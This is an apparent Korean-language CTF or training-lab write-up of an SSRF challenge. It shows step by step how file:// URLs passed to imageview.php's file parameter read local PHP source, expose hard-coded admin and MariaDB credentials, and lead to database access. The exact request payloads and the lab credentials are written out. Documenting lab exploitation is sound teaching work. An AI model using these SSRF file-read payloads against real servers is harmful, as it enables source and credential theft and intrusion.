========================
SSRF 4번
========================

1. 공격 과정
   내부 침투해서 정보 수집하는 과정
   1) 내부 침투
      (1) imageview.php의 file 파라미터에서 SSRF 취약점 확인
      (2) https:// 대신 file:// 프로토콜을 이용하여 로컬 PHP 소스코드 탈취
          응답의 Base64 데이터를 디코딩하여 소스코드 확인
          admin.php:
          file=file:///var/www/html/ssrf_2/admin.php&read=검색
      (3) admin.php에서 관리자 인증 및 DB 연결 기능 확인
      (4) admin_login.php 소스코드에서 관리자 계정 확인
          file=file:///var/www/html/ssrf_2/admin_login.php&read=검색
          ID: adminuser
          PW: adminpassword
      (5) 확보한 계정으로 관리자 로그인
          POST /ssrf_2/admin_login.php
          login_id=adminuser&login_pwd=adminpassword&okdk=로그인
      (6) 로그인 성공 후 admin.php의 DB 연결 페이지 접근

   2) 정보 탈취
      (1) declare.php에서 DB 관련 파일 경로 확인
          file=file:///var/www/html/ssrf_2/include/common/declare.php&read=검색
      (2) class.db.php에서 DB 연결 정보 및 SQL문 확인
          file=file:///var/www/html/ssrf_2/include/common/class.db.php&read=검색
      (3) property.php에서 추가 DB 설정 정보 확인
          file=file:///var/www/html/ssrf_2/include/common/property.php&read=검색
      (4) class.db.php에서 확인한 실제 DB 연결 정보
          Host: mariadb
          Username: ssrf_user
          Password: ssrf12#$
          Database: skinfosec
      (5) getanswer() 함수에서 정답 조회 SQL문 확인
          SELECT answer_column FROM ssrf_answer;
      (6) 관리자 페이지에서 확보한 DB 계정으로 접속
          POST /ssrf_2/admin.php
          host=mariadb&uname=ssrf_user&pass=ssrf12%23%24&sbmt=1
      (7) DB 접속 성공 후 정답 획득
